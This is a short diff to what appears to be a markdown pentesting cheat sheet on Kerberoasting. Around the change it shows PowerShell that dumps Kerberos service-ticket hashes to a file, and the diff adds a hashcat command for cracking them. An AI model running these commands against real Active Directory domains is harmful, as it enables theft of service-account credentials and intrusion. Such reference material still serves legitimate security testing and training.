@@ -31,5 +31,11 @@ New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentL
  Invoke-Kerberoast -OutputFormat hashcat  -ErrorAction SilentlyContinue | ft -HideTableHeaders -AutoSize Hash | Out-File -Width 5000 -Encoding "UTF8" .\roast.txt
 ```
 
+### Crack
 
+#### Hashcat
+
+```text
+hashcat -m 13100 hash.txt dic.lst --force
+```
 
